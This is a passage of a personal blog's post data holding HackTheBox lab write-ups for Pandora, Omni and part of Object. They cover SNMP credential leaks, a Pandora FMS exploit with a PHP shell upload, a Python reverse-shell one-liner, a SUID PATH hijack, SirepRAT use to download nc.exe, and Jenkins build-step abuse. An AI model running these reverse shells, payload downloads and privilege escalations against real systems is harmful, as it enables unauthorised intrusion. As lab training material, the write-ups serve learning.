ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)| 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)|_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Play | LandingService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel# UDP Scan â¤µï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ sudo nmap -T4 -sU 10.10.11.136[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 21:59 ISTWarning: 10.10.11.136 giving up on port because retransmission cap hit (6).Stats: 0:03:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP ScanUDP Scan Timing: About 24.30% done; ETC: 22:14 (0:10:54 remaining)Nmap scan report for panda.htb (10.10.11.136)Host is up (0.46s latency).Not shown: 995 closed udp ports (port-unreach)PORT STATE SERVICE161/udp open snmp17615/udp open|filtered unknown17762/udp open|filtered unknown28973/udp open|filtered unknown32775/udp open|filtered sometimes-rpc14Nmap done: 1 IP address (1 host up) scanned in 1030.83 seconds```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and I got this `panda.htb` site so I set the `/etc/hosts` file â†’![Untitled](Pandora/Untitled.png)## SNMP Enumeration â¤µï¸I got port 161 open as UDP port so lets enumerate it with this command lets see I will get something through this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ snmpwalk -c public -v1 -t 10 panda.htbiso.3.6.1.2.1.1.1.0 = STRING: \"Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64\"iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10iso.3.6.1.2.1.1.3.0 = Timeticks: (624771) 1:44:07.71iso.3.6.1.2.1.1.4.0 = STRING: \"Daniel\"iso.3.6.1.2.1.1.5.0 = STRING: \"pandora\"iso.3.6.1.2.1.1.6.0 = STRING: \"Mississippi\"iso.3.6.1.2.1.1.7.0 = INTEGER: 72iso.3.6.1.2.1.1.8.0 = Timeticks: (98) 0:00:00.98iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92iso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The SNMP Management Architecture MIB.\"iso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The MIB for Message Processing and Dispatching.\"iso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The management information definitions for the SNMP User-based Security Model.\"iso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\"iso.3.6.1.2.1.1.9.1.3.5 = STRING: \"View-based Access Control Model for SNMP.\"iso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing TCP implementations\"iso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing IP and ICMP implementations\"iso.3.6.1.2.1.1.9.1.3.8 = STRING: \"The MIB module for managing UDP implementations\"iso.3.6.1.2.1.1.9.1.3.9 = STRING: \"The MIB modules for managing SNMP Notification, plus filtering.\"iso.3.6.1.2.1.1.9.1.3.10 = STRING: \"The MIB module for logging SNMP Notifications.\"iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (97) 0:00:00.97iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (97) 0:00:00.97iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (97) 0:00:00.97......iso.3.6.1.2.1.25.4.2.1.5.692 = \"\"iso.3.6.1.2.1.25.4.2.1.5.714 = \"\"iso.3.6.1.2.1.25.4.2.1.5.715 = \"\"iso.3.6.1.2.1.25.4.2.1.5.759 = \"\"iso.3.6.1.2.1.25.4.2.1.5.770 = STRING: \"-f\"iso.3.6.1.2.1.25.4.2.1.5.772 = STRING: \"--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\"iso.3.6.1.2.1.25.4.2.1.5.782 = STRING: \"-f\"iso.3.6.1.2.1.25.4.2.1.5.790 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"iso.3.6.1.2.1.25.4.2.1.5.797 = STRING: \"--foreground\"iso.3.6.1.2.1.25.4.2.1.5.802 = STRING: \"/usr/bin/networkd-dispatcher --run-startup-triggers\"iso.3.6.1.2.1.25.4.2.1.5.808 = STRING: \"-n -iNONE\"iso.3.6.1.2.1.25.4.2.1.5.811 = \"\"iso.3.6.1.2.1.25.4.2.1.5.815 = \"\"iso.3.6.1.2.1.25.4.2.1.5.816 = STRING: \"-f\"iso.3.6.1.2.1.25.4.2.1.5.818 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.825 = STRING: \"-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid\"iso.3.6.1.2.1.25.4.2.1.5.827 = \"\"iso.3.6.1.2.1.25.4.2.1.5.901 = STRING: \"-o -p -- \\\\u --noclear tty1 linux\"iso.3.6.1.2.1.25.4.2.1.5.928 = STRING: \"--no-debug\"iso.3.6.1.2.1.25.4.2.1.5.975 = \"\"iso.3.6.1.2.1.25.4.2.1.5.1128 = STRING: \"-u daniel -p HotelBabylon23\"iso.3.6.1.2.1.25.4.2.1.5.1592 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.2327 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.2934 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.4035 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.5177 = \"\"iso.3.6.1.2.1.25.4.2.1.5.7327 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.10020 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.10393 = \"\"iso.3.6.1.2.1.25.4.2.1.5.10828 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.11958 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.12066 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.12791 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.12982 = \"\"iso.3.6.1.2.1.25.4.2.1.5.13019 = \"\"iso.3.6.1.2.1.25.4.2.1.5.13094 = \"\"iso.3.6.1.2.1.25.4.2.1.5.13095 = \"\"```{: .nolineno}I got some credentials through this SNMP enumeration â†’```bashdaniel : HotelBabylon23```{: .nolineno}## SSH Shell â¤µï¸Lets login with that shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ ssh daniel@panda.htbdaniel@panda.htb is password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 31 Dec 16:51:39 UTC 2023 System load: 0.08 Usage of /: 65.5% of 4.87GB Memory usage: 12% Swap usage: 0% Processes: 230 Users logged in: 0 IPv4 address for eth0: 10.10.11.136 IPv6 address for eth0: dead:beef::250:56ff:feb9:b642 => /boot is using 91.8% of 219MB0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateThe programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.daniel@pandora:~$ whoamidanieldaniel@pandora:~$ iduid=1001(daniel) gid=1001(daniel) groups=1001(daniel)daniel@pandora:~$```{: .nolineno}I saw the network configurations of port and I got port 80 and the web server directory that had pandora as a directory so I decided to do a Port Forwarding on that port â†’In attacker machine I executed this SSH forwording command and redirected the port 80 to the attackers machine `localhost:80` .```pythonâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ ssh -L 80:127.0.0.1:80 daniel@panda.htbdaniel@panda.htb is password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 31 Dec 17:34:19 UTC 2023 System load: 0.0 Usage of /: 65.5% of 4.87GB Memory usage: 18% Swap usage: 0% Processes: 222 Users logged in: 1 IPv4 address for eth0: 10.10.11.136 IPv6 address for eth0: dead:beef::250:56ff:feb9:b642 => /boot is using 91.8% of 219MB0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sun Dec 31 16:51:41 2023 from 10.10.16.10daniel@pandora:~$```{: .nolineno}Now I can load this `[localhost:80](http://localhost:80)` site â†’I got this vulnerability of `pandora FMS` site of this version on web â†’https://github.com/ibnuuby/CVE-2021-32099I used it and got redirected to the admin site automaticly â†’![Untitled](Pandora/Untitled%201.png)I followed the other link path and from `Admin tools > Extension Manager > Extension uploader` , I got to the upload site page and I uploaded the payload which is a RFI payload wrapper in zip file .![Untitled](Pandora/Untitled%202.png)```pythonâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ zip RFI.zip RFI.php adding: RFI.php (stored 0%)```{: .nolineno}I got the success response so lets load the RFI now â†’![Untitled](Pandora/Untitled%203.png)I loaded the extension URL â†’`http://localhost/pandora_console/extensions/RFI.php?cmd=id`![Untitled](Pandora/Untitled%204.png)I used the python3 reverse shell code this one to get the reverse shell â†’```pythonpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'```{: .nolineno}In response to that I got the shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.11.136] 33456/bin/sh: 0: cant access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'matt@pandora:/var/www/pandora/pandora_console/extensions$ cd ~cd ~matt@pandora:/home/matt$ whoamiwhoamimattmatt@pandora:/home/matt$ ididuid=1000(matt) gid=1000(matt) groups=1000(matt)matt@pandora:/home/matt$matt@pandora:/tmp$ find / -perm -u=s -type f 2>/dev/null/usr/bin/sudo/usr/bin/pkexec/usr/bin/chfn/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/umount/usr/bin/pandora_backup/usr/bin/passwd/usr/bin/mount/usr/bin/su/usr/bin/at/usr/bin/fusermount/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1matt@pandora:/tmp$```{: .nolineno}I checked the pandora_backup file and transfered it to the attacker machine â†’```pythonâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ strings -n 20 pandora_backup /lib64/ld-linux-x86-64.so.2_ITM_deregisterTMCloneTable_ITM_registerTMCloneTablePandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Check your permissions!Terminating program!GCC: (Debian 10.2.1-6) 10.2.1 20210110deregister_tm_clones__do_global_dtors_aux__do_global_dtors_aux_fini_array_entry__frame_dummy_init_array_entry_GLOBAL_OFFSET_TABLE__ITM_deregisterTMCloneTable__libc_start_main@GLIBC_2.2.5setreuid@GLIBC_2.2.5_ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5```{: .nolineno}I need to create a tar executable in a path and set the path accordingly so that my tar could execute in place of the real tar file before that I need to have a proper shell so.I created the ssh keys and login again from outside through private key â†’```pythonmatt@pandora:/home/matt$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/matt/.ssh/id_rsa): Created directory '/home/matt/.ssh'.Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/matt/.ssh/id_rsaYour public key has been saved in /home/matt/.ssh/id_rsa.pubThe key fingerprint is:SHA256:Qp8afmdihGyS2H/bN131q7W7lG1OpsQi3NO8zs6f/mQ matt@pandoraThe key's randomart image is:+---[RSA 3072]----+| || || . || o + o . .|| . + * S o|| = = . . + =|| + = = +.==E|| + * .o*+@o|| . .. =XBB|+----[SHA256]-----+matt@pandora:/home/matt$ matt@pandora:/home/matt$ cd .sshmatt@pandora:/home/matt/.ssh$ lsid_rsa id_rsa.pubmatt@pandora:/home/matt/.ssh$ mv id_rsa.pub authorized_keysmatt@pandora:/home/matt/.ssh$```{: .nolineno} I knew that the `/usr/bin/pandora_backup` file have SUIDs permissions so I created the tar command as executable from different path .```pythonmatt@pandora:/tmp$ echo \"/bin/bash\" > tarmatt@pandora:/tmp$ chmod +x tarmatt@pandora:/tmp$ export PATH=/tmp:$PATHmatt@pandora:/tmp$ /usr/bin/pandora_backupPandoraFMS Backup UtilityNow attempting to backup PandoraFMS clientroot@pandora:/tmp# whoamirootroot@pandora:/tmp# iduid=0(root) gid=1000(matt) groups=1000(matt)root@pandora:/tmp# cd /rootroot@pandora:/root# ls -altotal 36drwx------ 5 root root 4096 Dec 31 14:52 .drwxr-xr-x 18 root root 4096 Dec 7 2021 ..drwxr-xr-x 2 root root 4096 Dec 31 18:28 .backuplrwxrwxrwx 1 root root 9 Jun 11 2021 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 2 root root 4096 Jan 3 2022 .cache-rw-r--r-- 1 root root 250 Dec 31 14:52 .host_check-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-r-------- 1 root root 33 Dec 31 14:52 root.txtdrwx------ 2 root root 4096 Dec 7 2021 .sshroot@pandora:/root# cat root.txt83080c424f837712c2e6ff0f1843aab3root@pandora:/root#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Omni", "url": "/posts/Omni/", "categories": "HackTheBox", "tags": "Import-Clixml, PowerShell, PrivEsc, Public Exploit, Windows", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Omni]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.204Nmap scan report for 10.10.10.204Host is up (0.11s latency).Not show...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Omni]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.204Nmap scan report for 10.10.10.204Host is up (0.11s latency).Not shown: 65529 filtered tcp ports (no-response)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC5985/tcp open upnp Microsoft IIS httpd8080/tcp open upnp Microsoft IIS httpd| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=Windows Device Portal|_http-title: Site does not have a title.|_http-server-header: Microsoft-HTTPAPI/2.029817/tcp open unknown29819/tcp open arcserve ARCserve Discovery29820/tcp open unknown1 service unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸I checked port 8080 and there was a login page as an alert and I canâ€™t get access to it â†’![Untitled](Omni/Untitled.png)I ran `nikto` Tool and got this result â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Omni]â””â”€$ nikto -h http://10.10.10.204:8080/ -C all- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP: 10.10.10.204+ Target Hostname: 10.10.10.204+ Target Port: 8080+ Start Time: 2024-01-12 17:26:23 (GMT5.5)---------------------------------------------------------------------------+ Server: Microsoft-HTTPAPI/2.0+ /: Cookie CSRF-Token created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ / - Requires Authentication for realm 'Windows Device Portal'+ /: Default account found for 'Windows Device Portal' at (ID '', PW '0'). Accton wireless router. See: CWE-16+ Root page / redirects to: /authorizationrequired.htm+ /loleaflet/dist/admin/admin.html: LibreOffice Online Admin interface found (pass protected).+ 26588 requests: 1 error(s) and 5 item(s) reported on remote host+ End Time: 2024-01-12 18:18:26 (GMT5.5) (3123 seconds)---------------------------------------------------------------------------+ 1 host(s) tested```{: .nolineno}Then I enumerated further related to `Windows Device Portal` and I got one exploit to it that is related to IOT device .[https://github.com/SafeBreach-Labs/SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT)I tried it and got some results like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Omni/SirepRAT]â””â”€$ python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path \"C:\\Windows\\System32\\drivers\\etc\\hosts\" --v---------------------------# Copyright (c) 1993-2009 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corresponding host name.# The IP address and the host name should be separated by at least one# space.## Additionally, comments (such as these) may be inserted on individual# lines or following the machine name denoted by a '#' symbol.## For example:## 102.54.94.97 rhino.acme.com # source server# 38.25.63.10 x.acme.com # x client host# localhost name resolution is handled within DNS itself.#\t127.0.0.1 localhost#\t::1 localhost---------```{: .nolineno}So with this exploit I can `put some data` , `read some data` and `Execute some commands` so lets have a shell â†’I was able to transfer the `nc.exe` file to victim machine through powershell command â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Omni/SirepRAT]â””â”€$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \"/c powershell Invoke-WebRequest http://10.10.16.10/nc.exe -OutFile C:\\\\Windows\\\\System32\\\\nc.exe\" --v```{: .nolineno}![Untitled](Omni/Untitled%201.png)Now lets have a reverse shell â†’![Untitled](Omni/Untitled%202.png)I enumerated further but canâ€™t able to execute some alias commands like `whoami`,`ls`,`dir` in place of that I had to use powershell inbuild commands to do the work like wise for list directories I used `Get-ChildItem` as `ls` for files .I searched for `.txt` files as I was looking for user.txt file and I got this after opening it â†’```powershellPS C:\\> Get-ChildItem -Path C:\\Data\\ -Include *.txt -Recurse -forceGet-ChildItem -Path C:\\Data\\ -Include *.txt -Recurse -force Directory: C:\\Data\\ProgramData\\Microsoft\\DiagnosisMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/12/2024 10:17 AM 10 osver.txt Directory: C:\\Data\\Programs\\WindowsApps\\16454Windows10IOTCore.IOTCoreDefaul tApplication_3.0.0.0_x64__rz84sjny4rf58\\Assets\\MessagesMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/3/2020 11:23 PM 195 LogDescription.txt Directory: C:\\Data\\test\\bin\\WDTF\\Actions\\Console\\ButtonMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/26/2018 11:38 PM 4720 readme.txt Directory: C:\\Data\\Users\\administratorMode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 7/4/2020 9:48 PM 1958 root.txt Directory: C:\\Data\\Users\\appMode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 7/4/2020 8:20 PM 344 hardening.txt -ar--- 7/4/2020 9:53 PM 1958 user.txt PS C:\\>PS C:\\> cat C:\\Data\\Users\\app\\user.txtcat C:\\Data\\Users\\app\\user.txt System.Management.Automation.PSCredential System.Object System.Management.Automation.PSCredential flag 01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7 PS C:\\>```{: .nolineno}I got this kind of output for cracking the password I will need the system user password to do so , therefore lets enumerate further â†’I searched for some executables files like `.bat` , `.aspx` files and I got a hit into a hidden bat file that is `r.bat` â†’```powershellPS C:\\> Get-ChildItem -Path C:\\'Program Files'\\WindowsPowerShell\\* -Include *.bat -Recurse -forceGet-ChildItem -Path C:\\'Program Files'\\WindowsPowerShell\\* -Include *.bat -Recurse -force Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagementMode LastWriteTime Length Name ---- ------------- ------ ---- -a-h-- 8/21/2020 12:56 PM 247 r.bat Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\binMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/26/2018 11:36 PM 925 Pester.bat Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/26/2018 11:36 PM 744 Build.bat PS C:\\>```{: .nolineno}I opened this `r.bat` file and I got the credentials in it â†’```powershellPS C:\\Users\\Public> type C:\\'Program Files'\\WindowsPowerShell\\Modules\\PAckageManagement\\r.battype C:\\'Program Files'\\WindowsPowerShell\\Modules\\PAckageManagement\\r.bat@echo off:LOOPfor /F \"skip=6\" %%i in ('net localgroup \"administrators\"') do net localgroup \"administrators\" %%i /deletenet user app mesh5143net user administrator _1nt3rn37ofTh1nGzping -n 3 127.0.0.1clsGOTO :LOOP:EXITPS C:\\Users\\Public>```{: .nolineno}After I got the credentials for administrator I got login in port 8080 site and I got in â†’![Untitled](Omni/Untitled%203.png)I got access for `Run Commands` so lets have a shell again may be if I have a shell with high privileged user I could get Administrators shell â†’![Untitled](Omni/Untitled%204.png)I got the reverse shell callback â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Omni]â””â”€$ rlwrap nc -lvnp 445listening on [any] 445 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.10.204] 49675Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.PS C:\\windows\\system32> $env:username$env:usernameAdministratorPS C:\\windows\\system32> hostnamehostnameomniPS C:\\windows\\system32>```{: .nolineno}Now for the `user.txt` and `root.txt` files to decode here is the `PSCredentials` `Import-CliXml` command to access that data â†’```bashPS C:\\windows\\system32> (Import-CliXml -Path C:\\Data\\Users\\administrator\\root.txt).GetNetworkCredential().Password(Import-CliXml -Path C:\\Data\\Users\\administrator\\root.txt).GetNetworkCredential().Password5dbdce5569e2c4708617c0ce6e9bf11dPS C:\\windows\\system32>```{: .nolineno}and for user flag I have to relogin as app and get that reverse shell again as user app and then I can decode that `user.txt` flag .```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Omni]â””â”€$ rlwrap nc -lvnp 445listening on [any] 445 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.10.204] 49681Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.PS C:\\windows\\system32> $env:username$env:usernameappPS C:\\windows\\system32> hostnamehostnameomniPS C:\\windows\\system32> (Import-CliXml -Path C:\\Data\\Users\\app\\user.txt).GetNetworkCredential().Password(Import-CliXml -Path C:\\Data\\Users\\app\\user.txt).GetNetworkCredential().Password7cfd50f6bc34db3204898f1505ad9d70PS C:\\windows\\system32>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Object", "url": "/posts/Object/", "categories": "HackTheBox", "tags": "Active Directory, BloodHound, ForceChangePassword, GenericWrite, Jenkins, PrivEsc, Rubeus, WriteOwner", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Object]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.132 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 13:57...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Object]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.132 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 13:57 ISTNmap scan report for 10.10.11.132Host is up (0.098s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: Mega Engines5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and I got this site â†’![Untitled](Object/Untitled.png)I set the hosts value as `object.htb` now lets further enumerate this site â†’I clicked on automation and I redirected to port 8080 and this site is jenkins login page I tried to login with default credentials like admin : admin but no luck so I have created an account to login and see what privileges I am gona get â†’![Untitled](Object/Untitled%201.png)I logged in successfully , created an account names as StrongShiv8 and I got the version of Jenkins and also I canâ€™t load `script/` or `console/` directory I donâ€™t have access to that â†’ ![Untitled](Object/Untitled%202.png)I loaded those directories and got this error â†’![Untitled](Object/Untitled%203.png)After some enumeration and digging into this site I have created one `InfoJob` and named as `Access` and choosed `Freestyle project` .![Untitled](Object/Untitled%204.png)![Untitled](Object/Untitled%205.png)Now I inserted some description , It is not some mandatory though â†’![Untitled](Object/Untitled%206.png)I choose the `Add Build Step` as `Execute Windows Batch command` so that I can execute my commands on windows based host system.![Untitled](Object/Untitled%207.png)I included some command prompt commands into the Build Environment and Lets save it .![Untitled](Object/Untitled%208.png)But thatâ€™s not all I also have to set the Build Trigger to make it build so I selected this option and I have a option of Token Input and this API Token generation I also encountered in the configure page of user profile â†’![Untitled](Object/Untitled%209.png)Lets enter this Token which I have generated into that Build Trigger place â†’![Untitled](Object/Untitled%2010.png)Lets save it and access them in new tab â†’![Untitled](Object/Untitled%2011.png)It did not worked for me so lets try another way to Build this Trigger â†’![Untitled](Object/Untitled%2012.png)Like cronjobs I set the trigger as every minutes so this will build the a new project in every minute so If I have to rewrite the command I can do it from the command box and save it and wait for a minute or so , So lets try it â†’![Untitled](Object/Untitled%2013.png)I got the output so lets see what can I do over here â†’I tried different downloading command including of powershell but the `Antivirus` did not let it run it so I have an option for digging into this machine through this commands only so lets see the credentials of Jenkins user â†’I ran this command to see what inside of the .jenkins directory and the result was long so I sorted it and noted only the relevent information from this command :`cmd /c tree /f /a C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins````powershellC:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\workspace\\Access>cmd /c tree /f /a C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins Folder PATH listingVolume serial number is 212C-60B7C:\\USERS\\OLIVER\\APPDATA\\LOCAL\\JENKINS\\.JENKINS| .lastStarted| .owner| config.xml| hudson.model.UpdateCenter.xml| hudson.plugins.git.GitTool.xml| identity.key.enc| jenkins.install.InstallUtil.lastExecVersion| jenkins.install.UpgradeWizard.state| jenkins.model.JenkinsLocationConfiguration.xml| jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml| jenkins.security.QueueItemAuthenticatorConfiguration.xml| jenkins.security.UpdateSiteWarningsConfiguration.xml| jenkins.telemetry.Correlator.xml| nodeMonitors.xml| queue.xml| queue.xml.bak| secret.key| secret.key.not-so-secret| +---jobs| \\---Access| | config.xml| | nextBuildNumber| | | \\---builds| | legacyIds| | permalinks| | | +---1| | build.xml| | changelog.xml| | log| | | +---2| | build.xml| | changelog.xml| | log| | | +---3| | build.xml| | changelog.xml| | log| | | +---4| | build.xml| | changelog.xml| | log| | | +---5| | build.xml| | changelog.xml| | log| | | +---6| | build.xml| | changelog.xml| | log| | | +---7| | build.xml| | changelog.xml| | log| | | \\---8| changelog.xml| log| +---logs| \\---tasks| Fingerprint cleanup.log| Fingerprint cleanup.log.1| 